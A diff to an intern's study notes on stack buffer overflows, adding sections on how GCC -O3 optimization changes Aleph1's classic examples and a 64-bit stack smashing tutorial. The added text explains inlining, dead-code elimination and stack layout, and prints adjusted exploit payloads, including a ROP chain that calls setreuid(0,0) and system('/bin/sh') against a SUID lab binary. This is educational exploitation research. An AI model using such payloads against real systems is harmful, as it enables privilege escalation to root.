@@ -2,7 +2,7 @@
 pagetitle:  Notes for the Stack Buffer Overflow internship at INRIA Sophia
 title:      Notes for the Stack Buffer Overflow internship at INRIA Sophia
 author:     Florian Hofhammer
-date:       2020-04-27
+date:       2020-04-28
 ---
 
 # Virtual Machine setup
@@ -65,7 +65,7 @@ However, they can greatly reduce the time to find bugs and improve the exploit d
 # Smashing the Stack for fun and profit - Aleph1
 
 As a starting exercise, I am trying to recreate the examples and exploits from the [original paper](http://phrack.org/issues/49/14.html#article).
-The compiler flags for `gcc` generally used are `-m32 -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0` (see e.g. the [common Makefile](./Makefile.common) and the [directory specific Makefile](./Smashing%20the%20stack%20-%20Aleph1/Makefile)).
+The compiler / linker flags for `gcc` generally used are `-m32 -fno-stack-protector -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -g -z execstack` (see e.g. the [common Makefile](./Makefile.common) and the [directory specific Makefile](./Smashing%20the%20stack%20-%20Aleph1/Makefile)).
 Without those, current stack overflow mitigation measures do not allow to successfully overflow the buffers on the stack as described in the paper.
 
 ## example3.c
@@ -160,6 +160,181 @@ Additionally, appending the `-s` flag to the `eggshell` call uses a different sh
 With this addition, it is not only possible to spawn a shell at all, but also to spawn a shell with the executable's owner's privileges if the SUID bit on the executable is set.
 If the owner is set to `root` and the SUID bit is set (e.g. by executing `sudo chown root vulnerable && sudo chmod u+s vulnerable`), it is thus possible to spawn a root shell even when executing the exploit as a non-privileged user.
 
+## Optimized compilation
+
+The results described in the previous sections were achieved without any compiler optimizations enabled.
+If compiling with the highest optimizations in GCC (i.e. the `-O3` flag), the results are a little bit different.
+
+### example2.c
+
+If we look for example at [example2.c](./Smashing%20the%20stack%20-%20Aleph1/example2.c), we can immediately spot the vulnerability:
+In the function `function`, we copy the string the function receives into a 16 bytes buffer, no matter how big the string is.
+Without optimizations, this leads to a segmentation fault, as the given string (i.e. 255 * 'A') is way to big for the buffer and overflows the return address.
+With optimizations enabled, the function is completely inlined, i.e. the space for `buffer` is already allocated on the stack in the main function and instead of calling `function`, `main` just calls `strcpy` itself with the correct parameters, i.e. the addresses of `buffer` and `large_string`.   
+Because of how the stack is organized in this case, we don't get a segmentation fault as we expected.
+This is because the `buffer` array resides on the stack directly after the `large_string` array (i.e. with a lower address) (see explanatory figures below).
+Thus, instead of overwriting the return address, there is coincidentally enough space on the stack to overwrite without harming the saved frame pointer or the return address and the `strcpy` call overwrites the start of `large_string` instead of control flow information on the stack.
+Technically, this is still considered a buffer overflow even though it makes no harm in this particular case.
+
+Stack without optimization (each row corresponds to 4 bytes):
+```
+higher address |                             |
+               +-----------------------------+  ---+
+               | return address (main)       |     |
+               +-----------------------------+     |
+               | saved frame ptr (main)      |     |
+               +-----------------------------+     |
+               | i                           |     +--- stack frame of main
+               +-----------------------------+     |
+               | large_string[255 - 252]     |     |
+               | large_string[251 - 248]     |     |
+               |           ...               |     |
+               | large_string[3 - 0]         |     |
+               +-----------------------------+  ---+
+               | return address (function)   |  ---+
+               +-----------------------------+     |
+               | saved frame ptr (function)  |     |
+               +-----------------------------+     |
+               | buffer[15 - 12]             |     +--- stack frame of function
+               | buffer[11 - 8]              |     |
+               | buffer[7 - 4]               |     |
+               | buffer[3 - 0]               |     |
+               +-----------------------------+  ---+
+lower address  |                             |
+
+```
+
+Stack with optimization (each row corresponds to 4 bytes):
+```
+higher address |                             |
+               +-----------------------------+  ---+
+               | return address (main)       |     |
+               +-----------------------------+     |
+               | saved frame ptr (main)      |     |
+               +-----------------------------+     |
+               | large_string[255 - 252]     |     |
+               | large_string[251 - 248]     |     |
+               |           ...               |     +--- stack frame of main
+               | large_string[3 - 0]         |     |
+               +-----------------------------+     |
+               | buffer[15 - 12]             |     |
+               | buffer[11 - 8]              |     |
+               | buffer[7 - 4]               |     |
+               | buffer[3 - 0]               |     |
+               +-----------------------------+  ---+
+lower address  |                             |
+
+```
+
+### example3.c
+
+With [example3.c](./Smashing%20the%20stack%20-%20Aleph1/example3.c), the code also does not do what we expect, namely output `0` because we overwrote the return pointer of `function` in a way so that the `x = 1;` assignment is omitted.
+Here, the reason for this behavior is not inlining a function as we had previously but completely omitting a function.
+
+When disassembling the corresponding executable, we can see that the function `function` simply is completely omitted from the compiler output.
+This is because of four reasons:
+
+1. The function's argument policy is "call-by-value" and not "call-by-reference", i.e. the function just receives values from the caller but does not tamper with the caller's memory by e.g. getting some pointers to manipulate.
+2. The function has no return value (`void`) that would be saved in the caller's function and reused.
+3. The function does not access any global or otherwise somehow shared variables.
+4. The function does not call any other functions which might influence the result / behavior (e.g. `printf`, `memset`, etc.).
+
+Because of those four reasons, the result of the compiler analysis is that this function does not have any functionality that influences the result (whereas it has: overwriting the return pointer).
+Thus, the compiler completely omits this function.
+
+Therefore, the code is compiled in such a way that it simply outputs `1` via `printf` with a value `x = 1`.
+
+### testsc.c and testsc2.c
+
+The behavior of [testsc.c](./Smashing%20the%20stack%20-%20Aleph1/testsc.c) and [testsc2.c](./Smashing%20the%20stack%20-%20Aleph1/testsc2.c) is exactly the same when compiled with optimizations and is similar to the behavior of `example3` as described above.
+
+GCC determines that the assignments (address of return address to `ret`, shellcode address to `*ret`) do not influence the further program flow (whereas they do, they overwrite the return pointer).
+Thus, they can be omitted according to the compiler.
+Because of this behavior, the compiler output for the corresponding optimized main functions is
+
+```asm
+endbr32
+ret
+```
+
+instead of
+
+```asm
+endbr32
+push   %ebp
+mov    %esp,%ebp
+sub    $0x4,%esp
+call   11a9 <__x86.get_pc_thunk.dx>
+add    $0x2e20,%edx
+lea    -0x4(%ebp),%eax     # load address of ret
+add    $0x8,%eax           # increment address by 8 bytes = 2 words (32 bits each)
+mov    %eax,-0x4(%ebp)     # save new address of ret to ret
+mov    -0x4(%ebp),%eax     # load ret
+lea    0x44(%edx),%edx     # load address of shellcode
+mov    %edx,(%eax)         # save address of shellcode to ret
+nop
+leave
+ret
+```
+
+(comments added for better readability).
+
+The optimized `main` thus does only one thing: immediately return without any action.
+
+Changing the main function from 
+
+```c
+void main() {
+    int *ret;
+    ret = (int *)&ret + 2;
+    (*ret) = (int)shellcode;
+}
+```
+
+to
+
+```c
+void main() {
+    int *ret;
+    ret = (int *)&ret + 2;
+    (*ret) = (int)shellcode;
+    printf("ret: %p\n", ret);
+}
+```
+
+forces the compiler to include the calculations and assignments concerning `ret` in the compiler output, as `ret` is explicitely referenced in an output to the console.
+
+
+### Exploits
+
+Concerning the exploits (`overflow1`, `exploit2`, `exploit3`, `exploit4`, `eggshell`), there is not a huge difference whether the code is optimized or not.
+
+One change that is necessary is to explicitly return the stack pointer address from the `get_sp` functions instead of just copying it to the `eax` register and assuming that this register is used for the return value.
+Because of the optimizations, GCC may inline the `get_sp` function and not realize that the value in `eax` is important and just discard it.
+Thus, a change from
+
+```c
+unsigned long get_sp(void) {
+    asm("movl %esp,%eax");
+}
+```
+
+to
+
+```c
+unsigned long get_sp(void) {
+    unsigned long result;
+    asm("movl %%esp,%0"
+        : "=g"(result));
+    return result;
+}
+```
+
+solves the problem by switching from `basic asm` notation to `extended asm` notation (see [GCC documentation](https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html)), as the stack pointer address is now explicitely saved to a variable and returned.
+Both versions have exactly the same output for `get_sp` (if compiled with optimizations) but the latter one forces GCC to really use the returned value in `eax` and not discard it.
+
+With this change made, the non-optimized exploits still work as described in the above sections.
+For the optimized exploits, it is sufficient to change the offsets for `exploit2` (`1676` instead of `1660`) and `exploit3` (`1600` instead of `350`), the other exploits (namely: `overflow1`, `exploit4`, `eggshell`) still work as expected.
 
 # 64-bit Linux stack smashing
 
@@ -296,6 +471,101 @@ However, it is also possible to launch such an exploit locally.
 This was conducted using the Python `pwntools`.
 The [poc_local.py](./64bit%20Stack%20smashing%20-%20superkojiman/poc_local.py) contains the code for a local exploit.
 In addition to the original exploit, this variant also calls `setreuid` in order to achieve privilege escalation when a vulnerable executable with the SUID bit set is exploited.
+
+## Optimized compilation
+
+As with the executables from the [Aleph1 exploits](#smashing-the-stack-for-fun-and-profit---aleph1), no compiler optimizations were activated during the compilation of the executables used for the three parts of the tutorial.
+With optimizations enabled (`-O3` flag), the exploits have to be conducted a little bit different, which is explained in the following.
+
+### Part 1
+
+The [first part](#part-1) was just about overflowing a buffer and overwriting the return address with the address of an environment variable on the stack.
+The main difference here is that GCC tries to keep some variables only in registers if possible when optimization is enabled.
+
+Here, the variable `int r` is affected by such an optimization.   
+In the non-optimized version, 96 bytes on the stack are reserved for the buffer `buf` and the integer variable `r`.
+Those 96 bytes are divided into 80 bytes for the buffer and 16 bytes for the integer.
+`r` as a 32 bit integer should theoretically only need 4 bytes of memory on the stack.
+However, the stack by default is always aligned on 16 bytes on x86_64 / amd64 architectures which is why 96 bytes of stack memory are allocated.   
+In the optimized version, only 80 bytes on the stack are reserved for the buffer `buf`.
+The integer variable `r` is never written on the stack.
+As a return value of the call to `read`, `r` is located in the register `rax` after that call.
+The value is then directly copied from `rax` to `rsi` which holds a parameter for `printf`.
+Thus, only 80 bytes of stack memory are necessary here.
+
+This is the reason why the overflow with the `pwn_vulnerable.sh` script does not work:
+Initially, it overwrites 104 bytes with junk (80 bytes for `buf`, 16 bytes for `r` and padding, 8 bytes for the saved frame pointer) and then the return address with the address of the environment variable.
+With the optimized executable, it should only overwrite 88 bytes (80 bytes for `buf`, 8 bytes for the saved frame pointer) with junk.
+As it overwrites 104 bytes, it also overwrites the return address with junk which is why returning from the vulnerable function gives a segmentation fault.
+
+This issue can easily be resolved with a small change to the exploit script by changing [line 14](./64bit%20Stack%20smashing%20-%20superkojiman/pwn_vulnerable.sh#L14) from
+
+```bash
+python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 104 + pack('<Q', $(echo $addr)))"
+```
+
+to
+
+```bash
+python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 88 + pack('<Q', $(echo $addr)) * 3)"
+```
+
+Instead of providing 104 bytes of junk and an 8 byte address (= 112 bytes total), it then provides 88 bytes of junk and three times an 8 byte address (= 112 bytes total).   
+For the non-optimized vulnerable executable, this doesn't make a difference for the result.
+The only difference is that the last 8 bytes before the saved frame pointer and the saved frame pointer are overwritten with the address we want to return to instead of junk.   
+For the optimized vulnerable executable, the return address is now written to the right position on the stack.
+The buffer and the saved frame pointer are completely overwritten with the junk in this case.
+In this case, parts of the previous stack frame are also overwritten (i.e. the lowest 16 bytes with twice the address).
+However, as we just want to return to the shellcode, this doesn't make a difference for the result here.
+
+### Part 2
+
+For part 2 of the tutorial, basically the same changes apply as for [part 1](#part-1-1).
+Instead of padding with 104 bytes of junk, we only need 88 bytes of padding if the executable is compiled with compiler optimizations.
+
+In addition to that, we're not overwriting the return address with a stack address that we determined before but with the address of an instruction in the same executable.
+Because of the compiler options being enabled, GCC may output the code at different offsets (position independent executables, PIE) or addresses (non-PIE).
+This is exactly what happens here: The address of the `ret` instruction in the `vuln` function changed.
+Luckily, all other addresses stayed the same despite the optimized code.
+This explicitely means that the addresses referring to `__libc_csu_init` and the `/bin/sh` string didn't change.
+The addresses for the functions from libc (i.e. `system` and `setreuid`) didn't change as libc is always loaded at the same base address, no matter whether the executable was compiled with compiler optimizations enabled or not.
+
+Thus, it is sufficient to change the lines
+
+```python
+    b'A' * 104 +                        # Padding to reach the return address
+    pack('<Q', 0x00005555555551da) +    # Address of ret in function vuln
+```
+
+to
+
+```python
+    b'A' *88 +                          # Padding to reach the return address
+    pack('<Q', 0x0000555555555204) +    # Address of ret in function vuln
+```
+
+in the [original exploit codes](#part-2).
+
+Giving just the exploit code including the `setreuid` call, this change results in the following code, working for the optimized executable:
+
+```bash
+(python3 -c "from struct import pack; import sys; sys.stdout.buffer.write(
+    b'A' * 88 +                         # Padding to reach the return address
+    pack('<Q', 0x0000555555555204) +    # Address of ret in function vuln
+    pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
+    pack('<Q', 0x0000000000000000) +    # Value 0 => uid of root
+    pack('<Q', 0x0000555555555271) +    # Address of pop rsi; pop r15; ret in function __libc_csu_init
+    pack('<Q', 0x0000000000000000) +    # Value 0 => uid of root (into rsi)
+    pack('<Q', 0x4141411411414141) +    # Junk (into r15)
+    pack('<Q', 0x00007ffff7eda920) +    # Address of function setreuid
+    pack('<Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init
+    pack('<Q', 0x000055555555603f) +    # Address of "/bin/sh" in function main
+    pack('<Q', 0x00007ffff7e18410)      # Address of function system
+    )"; cat) | ./vulnerable
+```
+
+For the non-optimized version, the original code has to be used.
+Thus, it is in that case not possible to create a single input that triggers the vulnerability in both the non-optimized and the optimized executable reliably.
 
 # ASLR Smack and Laugh
 
